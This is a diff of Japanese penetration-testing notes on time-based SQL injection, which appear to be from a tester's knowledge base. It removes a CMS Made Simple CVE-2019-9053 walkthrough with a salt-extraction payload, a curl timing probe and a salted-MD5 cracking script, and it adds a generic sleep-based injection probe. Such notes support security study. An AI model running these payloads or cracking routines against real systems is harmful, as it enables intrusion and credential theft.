@@ -105,50 +105,20 @@ sqlmap -u "http://[TARGET]/page" \
 
 ハッシュよりソルトを先に取得する理由：多くのWebアプリは `md5(salt + password)` でハッシュを生成するため、ソルトなしではクラックできない。
 
-### 手順（CMS Made Simple ≤ 2.2.9 / CVE-2019-9053 パターン）
+### 手順（汎用：手動タイムベース確認 → エクスプロイトスクリプトの調整 → クラック）
 
 ```bash
-# searchsploit でエクスプロイトを確認・取得
-searchsploit cms made simple
-searchsploit -m php/webapps/46635.py
+# [Attacker] 脆弱性の存在確認（3秒遅延するか）
+curl -s "http://[TARGET]/[エンドポイント]?[VULN_PARAM]=a,b,1,5))+and+(select+sleep(3))+--+" \
+  -o /dev/null -w "%{time_total}\n"
+# 3秒以上かかれば SQLi 成立
 ```
 
-**Python 2系スクリプトを Python 3 で動かす手順：**
-1. `searchsploit -m [PATH]` でスクリプトをカレントディレクトリにコピーする
-2. `python [script.py]` を実行してエラーが出るか確認する
-3. エラーが出た場合はエディタで以下の箇所を修正する：
-   - `print "..."` → `print("...")`
-   - `hashlib.md5(str(salt) + word)` → `hashlib.md5((salt + word).encode()).hexdigest()`
-4. 修正後に再実行する
+エクスプロイトスクリプトが見つかった場合は `searchsploit -m [PATH]` で取得し、Python 2 系であれば `print` 文の括弧化と `hashlib.md5((salt + word).encode())` への修正が必要なことが多い。
 
-**ペイロード構造（タイムベース文字抽出）：**
-```
-# ソルト抽出ペイロード例
-a,b,1,5))+and+(select+sleep(3)+from+cms_siteprefs+where+sitepref_value+like+0x[HEX_PREFIX]25+and+sitepref_name+like+0x736974656d61736b)+--+
-```
+抽出後のソルト + MD5 ハッシュに対するクラックは Python の単純ループ（`hashlib.md5((salt + word).encode()).hexdigest()` を rockyou.txt の各行で計算）で実行できる。詳細フォーマットの例とアプリ × バージョン固有のペイロードは CVE_Notes.md にまとめてある：
 
-**手動でのタイムベースSQLi確認：**
-```bash
-# 脆弱性の存在確認（3秒遅延するか）
-curl -s "http://[TARGET]/moduleinterface.php?mact=News,m1_,default,0&m1_idlist=a,b,1,5))+and+(select+sleep(3))+--+" -o /dev/null -w "%{time_total}\n"
-# 3秒以上かかれば SQLi が成立している
-```
-
-**Python でのパスワードクラック（ソルト付きMD5）：**
-```python
-# [Attacker] 以下はテスター端末で実行する
-import hashlib
-
-salt   = "[取得したソルト]"
-hash_  = "[取得したMD5ハッシュ]"
-
-with open("/usr/share/wordlists/rockyou.txt", errors="ignore") as f:
-    for line in f:
-        word = line.strip()
-        if hashlib.md5((salt + word).encode()).hexdigest() == hash_:
-            print(f"[+] パスワード: {word}")
-            break
-```
+- **CMS Made Simple ≤ 2.2.9（CVE-2019-9053）** → `../../05_Tools_Reference/CVE_Notes.md`
 
 ### 注意点・落とし穴
 
@@ -163,6 +133,7 @@ with open("/usr/share/wordlists/rockyou.txt", errors="ignore") as f:
 ## 関連技術
 
 - 前：ログインフォームまたはURLパラメータを発見 → `../../01_Reconnaissance/Web_Enumeration.md`
+- 関連：アプリ × バージョン固有のペイロード（CMS Made Simple 等） → `../../05_Tools_Reference/CVE_Notes.md`
 - 後：認証情報が取得できた → `../Credential_Discovery.md`
 - 後：MD5+Salt ハッシュのクラック → `../../05_Tools_Reference/Hashcat.md`（mode 20）
 - 後：管理者パネルにアクセスできた → Webアプリ固有の機能を調査。コマンドインジェクション等を試す → `Command_Injection.md`
